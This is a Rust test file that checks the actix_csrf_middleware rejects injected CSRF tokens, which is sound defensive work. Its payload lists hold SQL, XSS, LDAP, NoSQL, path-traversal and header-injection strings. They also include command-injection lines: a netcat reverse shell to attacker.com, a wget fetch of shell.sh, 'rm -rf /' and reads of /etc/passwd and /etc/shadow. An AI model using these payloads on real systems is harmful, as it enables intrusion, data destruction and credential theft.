mod common;

use actix_csrf_middleware::{CsrfMiddlewareConfig, DEFAULT_FORM_FIELD, DEFAULT_HEADER};
use actix_web::{http::StatusCode, http::header::ContentType, test};
use common::*;
use serde_json::json;

/// Test SQL injection attempts in CSRF tokens
#[actix_web::test]
async fn test_sql_injection_in_csrf_token() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let sql_injection_payloads = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM sessions WHERE id = '1'; --",
        "' UNION SELECT * FROM users; --",
        "\"; DROP DATABASE csrf; --",
    ];

    for payload in sql_injection_payloads {
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_HEADER, payload))
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "SQL injection payload '{}' should be rejected",
            payload
        );
    }
}

/// Test XSS injection attempts in CSRF tokens and forms
#[actix_web::test]
async fn test_xss_injection_in_csrf_forms() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let xss_payloads = vec![
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "'><img src=x onerror=alert('XSS')>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E", // URL encoded
    ];

    for payload in xss_payloads {
        // Test in header
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_HEADER, payload))
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "XSS payload '{}' in header should be rejected",
            payload
        );

        // Test in form data
        let form_data = format!("{}={}", DEFAULT_FORM_FIELD, payload);
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::form_url_encoded())
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .set_payload(form_data)
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "XSS payload '{}' in form should be rejected",
            payload
        );
    }
}

/// Test command injection attempts
#[actix_web::test]
async fn test_command_injection_in_csrf_token() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let command_injection_payloads = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget malicious.com/shell.sh",
        "`whoami`",
        "$(cat /etc/shadow)",
        "; nc -e /bin/sh attacker.com 4444",
    ];

    for payload in command_injection_payloads {
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_HEADER, payload))
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Command injection payload '{}' should be rejected",
            payload
        );
    }
}

/// Test NoSQL injection attempts in JSON payloads
#[actix_web::test]
async fn test_nosql_injection_in_json_csrf() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let json_injection_payloads = vec![
        json!({
            "csrf_token": {"$ne": null}
        }),
        json!({
            "csrf_token": {"$gt": ""}
        }),
        json!({
            "csrf_token": {"$regex": ".*"}
        }),
        json!({
            "csrf_token": {"$where": "function() { return true; }"}
        }),
    ];

    for payload in json_injection_payloads {
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::json())
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .set_json(payload)
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "NoSQL injection should be rejected"
        );
    }
}

/// Test LDAP injection attempts
#[actix_web::test]
async fn test_ldap_injection_in_csrf_token() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let ldap_injection_payloads = vec![
        "*)(uid=*",
        "*)(|(uid=*))",
        "*))%00",
        "*)((|1=1)",
        "*)(mail=*)",
    ];

    for payload in ldap_injection_payloads {
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_HEADER, payload))
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "LDAP injection payload '{}' should be rejected",
            payload
        );
    }
}

/// Test path traversal attempts in custom headers
#[actix_web::test]
async fn test_path_traversal_injection() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd", // Double URL encoded
    ];

    for payload in path_traversal_payloads {
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header((DEFAULT_HEADER, payload))
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Path traversal payload '{}' should be rejected",
            payload
        );
    }
}

/// Test null byte injection attempts
#[actix_web::test]
async fn test_null_byte_injection() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    let null_byte_payloads = vec![
        "valid_token\0.txt",
        "token\0\0.exe",
        "\0/etc/passwd",
        "csrf\0token",
    ];

    for payload in null_byte_payloads {
        // Test in form data instead of headers (headers can't contain null bytes)
        let form_data = format!("{}={}", DEFAULT_FORM_FIELD, payload);
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::form_url_encoded())
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .set_payload(form_data)
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Null byte injection payload should be rejected"
        );
    }
}

/// Test header injection attempts (simulated in form data)
#[actix_web::test]
async fn test_header_injection_csrf() {
    let app = build_app(CsrfMiddlewareConfig::double_submit_cookie(&get_secret_key())).await;
    let (_token, token_cookie, session_cookie) = token_cookie(&app, None, None).await;

    // Note: Real header injection is prevented by HTTP spec (actix-http rejects \r\n in headers)
    // So we test these payloads in form data where they would reach our middleware
    let header_injection_payloads = vec![
        "valid_token\r\nSet-Cookie: admin=true",
        "token\n\rLocation: http://malicious.com",
        "csrf\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
        "token\r\nX-Forwarded-For: 127.0.0.1",
    ];

    for payload in header_injection_payloads {
        // Test in form data instead of headers (headers can't contain \r\n)
        let form_data = format!("{}={}", DEFAULT_FORM_FIELD, payload);
        let req = test::TestRequest::post()
            .uri("/submit")
            .insert_header(ContentType::form_url_encoded())
            .cookie(token_cookie.clone())
            .cookie(session_cookie.clone())
            .set_payload(form_data)
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Header injection payload should be rejected"
        );
    }
}

fn get_secret_key() -> Vec<u8> {
    b"super-secret".to_vec()
}

pub async fn token_cookie<S>(
    app: &S,
    session_id_cookie_name: Option<&str>,
    token_cookie_name: Option<&str>,
) -> (
    String,
    actix_web::cookie::Cookie<'static>,
    actix_web::cookie::Cookie<'static>,
)
where
    S: actix_web::dev::Service<
            actix_http::Request,
            Response = actix_web::dev::ServiceResponse<
                actix_http::body::EitherBody<actix_http::body::BoxBody>,
            >,
            Error = actix_web::Error,
        >,
{
    use actix_csrf_middleware::{
        DEFAULT_COOKIE_NAME, DEFAULT_SESSION_ID_COOKIE_NAME, PRE_SESSION_COOKIE_NAME,
    };

    let req = test::TestRequest::get().uri("/form").to_request();
    let resp = test::call_service(&app, req).await;

    let session_id_cookie_name = session_id_cookie_name.unwrap_or(DEFAULT_SESSION_ID_COOKIE_NAME);
    let token_cookie_name = token_cookie_name.unwrap_or(DEFAULT_COOKIE_NAME);

    let session_id_cookie = resp
        .response()
        .cookies()
        .find(|c| c.name() == session_id_cookie_name || c.name() == PRE_SESSION_COOKIE_NAME)
        .map(|c| c.into_owned())
        .unwrap();

    let token_cookie = resp
        .response()
        .cookies()
        .find(|c| c.name() == token_cookie_name)
        .map(|c| c.into_owned())
        .unwrap();

    let body = test::read_body(resp).await;
    let token = String::from_utf8(body.to_vec()).unwrap();
    let token = token.strip_prefix("token:").unwrap().to_string();

    (token, token_cookie, session_id_cookie)
}
